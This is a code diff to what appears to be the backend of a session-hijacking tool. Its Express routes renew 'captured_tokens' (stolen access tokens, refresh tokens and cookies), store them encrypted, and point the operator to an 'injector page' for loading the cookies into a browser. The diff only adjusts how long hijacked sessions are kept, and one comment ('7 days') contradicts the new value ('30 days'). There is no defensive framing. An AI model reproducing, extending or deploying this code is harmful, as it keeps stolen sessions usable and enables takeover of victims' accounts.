@@ -411,7 +411,7 @@ router.post('/:id/renew', userAuth, async (req, res) => {
         );
 
         if (result.success && result.cookies) {
-          const ttlHours = 24 * 365 * 100;
+          const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
           const newAccessToken = result.access_token || accessToken;
           const newRefreshToken = result.new_refresh_token || refreshToken;
 
@@ -460,7 +460,7 @@ router.post('/:id/renew', userAuth, async (req, res) => {
       );
 
       if (cookieResult.success && cookieResult.cookies) {
-        const ttlHours = 24 * 365 * 100;
+        const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
         await db.query(
           'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=COALESCE(renewal_count,0)+1 WHERE id=?',
           [encrypt(cookieResult.cookies), 'cookie', ttlHours, token.id]
@@ -600,7 +600,7 @@ router.post('/convert-cookie', userAuth, async (req, res) => {
         cookies: result.cookies,
         cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
         // FIX: Use reasonable TTL (7 days) instead of hardcoded "100 years"
-        expires: '7 days',
+        expires: '30 days',
         instructions: 'Use the injector page to set cookies in your browser'
       });
     } else {
